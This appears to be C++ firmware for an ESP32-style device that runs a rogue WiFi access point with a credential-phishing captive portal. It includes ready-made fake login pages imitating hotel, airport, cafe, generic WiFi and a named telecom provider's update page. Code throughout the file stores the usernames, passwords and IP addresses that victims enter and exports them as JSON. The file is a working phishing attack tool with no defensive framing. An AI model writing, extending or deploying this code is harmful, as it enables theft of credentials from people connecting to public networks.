#include "hardware.h"
#include "captive_portal.h"
#include <ArduinoJson.h>

CapturedCred capturedCreds[MAX_CAPTURED_CREDS];
int capturedCount = 0;
bool portalActive = false;

PortalStyle portalStyles[] = {
  {"wifi_login", "WiFi Login",         "Connect to the network",     "\xF0\x9F\x93\xB6", "#2563eb", "linear-gradient(135deg,#1e40af,#3b82f6)", "Email / Phone", "Password", "WiFi-Free"},
  {"hotel",      "Hotel WiFi",         "Internet Access",            "\xF0\x9F\x8F\xA8", "#059669", "linear-gradient(135deg,#065f46,#10b981)", "Room Number", "Full Name", "Hotel_WiFi"},
  {"isp_update", "Provider Update",    "Configuration Required",     "\xF0\x9F\x94\xA7", "#d97706", "linear-gradient(135deg,#92400e,#f59e0b)", "Username", "Password", "MarocTelecom_Update"},
  {"airport",    "Airport WiFi",       "Free Connection",             "\xE2\x9C\x88\xEF\xB8\x8F", "#7c3aed", "linear-gradient(135deg,#5b21b6,#8b5cf6)", "Email", "Flight Number", "Airport_Free"},
  {"cafe",       "Cafe WiFi",          "Free Connection",             "\xE2\x98\x95", "#ea580c", "linear-gradient(135deg,#9a3412,#f97316)", "Email", "Phone", "Cafe_Free"}
};
const int NUM_PORTAL_STYLES = 5;

static int activeTemplate = 0;

void initCaptivePortal() {
  capturedCount = 0;
  portalActive = false;
}

void startCaptivePortal(int templateIdx, const char* customSSID) {
  if (templateIdx < 0 || templateIdx >= NUM_PORTAL_STYLES) templateIdx = 0;
  activeTemplate = templateIdx;
  portalActive = true;
  capturedCount = 0;

  // Reconfigure AP SSID if custom name provided
  if (customSSID && strlen(customSSID) > 0) {
    WiFi.softAP(customSSID, AP_PASSWORD);
  } else {
    WiFi.softAP(portalStyles[templateIdx].defaultSSID, AP_PASSWORD);
  }
}

void stopCaptivePortal() {
  portalActive = false;
  // Restore default AP
  WiFi.softAP(AP_SSID, AP_PASSWORD);
}

void clearCreds() {
  capturedCount = 0;
  // Zero out credential data for security
  for (int i = 0; i < MAX_CAPTURED_CREDS; i++) {
    memset(capturedCreds[i].username, 0, sizeof(capturedCreds[i].username));
    memset(capturedCreds[i].password, 0, sizeof(capturedCreds[i].password));
  }
}

bool captureCred(const char* user, const char* pass, const char* ip) {
  if (capturedCount >= MAX_CAPTURED_CREDS) return false;
  if (!user || !pass) return false;

  CapturedCred &c = capturedCreds[capturedCount];
  strncpy(c.username, user, sizeof(c.username) - 1);
  c.username[sizeof(c.username) - 1] = '\0';
  strncpy(c.password, pass, sizeof(c.password) - 1);
  c.password[sizeof(c.password) - 1] = '\0';
  if (ip) {
    strncpy(c.ip, ip, sizeof(c.ip) - 1);
    c.ip[sizeof(c.ip) - 1] = '\0';
  }
  c.timestamp = millis();
  c.portalType = activeTemplate;
  capturedCount++;
  return true;
}

int getActivePortalTemplate() {
  return activeTemplate;
}

String getPortalStatusJSON() {
  JsonDocument doc;
  doc["active"] = portalActive;
  doc["captured"] = capturedCount;
  String out;
  serializeJson(doc, out);
  return out;
}

String getPortalCredsJSON() {
  JsonDocument doc;
  JsonArray arr = doc.to<JsonArray>();
  for (int i = 0; i < capturedCount && i < MAX_CAPTURED_CREDS; i++) {
    JsonObject obj = arr.add<JsonObject>();
    obj["user"] = capturedCreds[i].username;
    obj["pass"] = capturedCreds[i].password;
    obj["ip"] = capturedCreds[i].ip;
    obj["ts"] = capturedCreds[i].timestamp;
  }
  String out;
  serializeJson(doc, out);
  return out;
}

String getPortalTemplatesJSON() {
  JsonDocument doc;
  JsonArray arr = doc.to<JsonArray>();
  for (int i = 0; i < NUM_PORTAL_STYLES; i++) {
    JsonObject obj = arr.add<JsonObject>();
    obj["id"] = portalStyles[i].id;
    obj["title"] = portalStyles[i].title;
  }
  String out;
  serializeJson(doc, out);
  return out;
}

String generatePortalHTML(int templateIdx) {
  if (templateIdx < 0 || templateIdx >= NUM_PORTAL_STYLES) templateIdx = 0;
  PortalStyle &s = portalStyles[templateIdx];
  String html = "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'>";
  html += "<style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:system-ui;min-height:100vh;display:flex;align-items:center;justify-content:center;background:";
  html += s.bgGradient;
  html += "}.card{background:#fff;border-radius:16px;padding:2rem;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.2)}.icon{font-size:3rem;margin-bottom:.5rem}h2{color:#1d1d1f;margin-bottom:.2rem;font-size:1.3rem}p{color:#6e6e73;font-size:.9rem;margin-bottom:1.5rem}input{width:100%;padding:.8rem;border:1px solid #d1d5db;border-radius:10px;font-size:.95rem;margin-bottom:.6rem;outline:none}input:focus{border-color:";
  html += s.primaryColor;
  html += "}button{width:100%;padding:.8rem;background:";
  html += s.primaryColor;
  html += ";color:#fff;border:none;border-radius:10px;font-size:1rem;font-weight:600;cursor:pointer}</style></head><body><div class=card><div class=icon>";
  html += s.icon;
  html += "</div><h2>";
  html += s.title;
  html += "</h2><p>";
  html += s.subtitle;
  html += "</p><form action=/capture method=POST><input name=username placeholder='";
  html += s.userPlaceholder;
  html += "'><input name=password type=password placeholder='";
  html += s.passPlaceholder;
  html += "'><button type=submit>Connect</button></form></div></body></html>";
  return html;
}

String generateSuccessHTML() {
  return "<!DOCTYPE html><html><head><meta name=viewport content='width=device-width,initial-scale=1'><style>body{font-family:system-ui;min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f0f0f5}.msg{text-align:center}h2{color:#16a34a;font-size:1.5rem}p{color:#6e6e73}</style></head><body><div class=msg><h2>Connected</h2><p>You are now online</p></div></body></html>";
}